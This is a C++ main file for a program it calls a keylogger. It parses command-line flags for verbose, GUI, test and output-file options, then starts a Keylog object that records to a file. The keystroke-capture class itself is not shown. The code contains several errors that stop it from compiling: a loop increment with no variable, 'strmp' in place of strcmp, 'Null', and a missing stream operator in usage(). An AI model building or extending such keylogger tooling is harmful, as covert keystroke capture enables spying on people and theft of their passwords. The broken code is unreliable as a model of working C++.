
#include "main.hh"

s_gl_env gl_env;

int main(int argc, char** argv){
	int i;
	const char* outputFile;

	signal(SIGINT, shutdown);
	outputFile = Null;

	if(argc < 2){
		cerr << "Invalid num of command line arguments" << endl;
		usage();
		return 1;
	}

	// Parse Command Line Arguments
	for(i = 1; i < argc; ++){
		if(strmp(argv[i], "-h") == 0){
			usage();
			return 0;
		}
		else if(strcmp(argv[i], "-t") == 0){
			runTests();
			return 0;
		}
		else if(strcmp(argv[i], "-v") == 0){
			gl_env.verboseOutput = true;
		}
		else if(strcmp(argv[i], "-g") == 0){
			gl_env.gui = true;
		}
		else if(strcmp(argv[i], "-f") == 0){
			outputFile = argv[i + 1];
		}
	}

	// Start Keylogger 
	gl_env.logger = new Keylog(outputFile);
	gl_env.logger->run();
	return 0;
}

// usage 

void usage(){
	cout << endl;
	cout << "Usage: " endl;
	cout << "./keylogger [-vthgf]" << endl;
	cout << "-v Verbose output" << endl;
	cout << "-t Run unit tests" << endl;
	cout << "-g GUI mode" << endl;
	cout << "-f [fileName] specify an output file" << endl;
	cout << "-h Display this message" << endl;
}
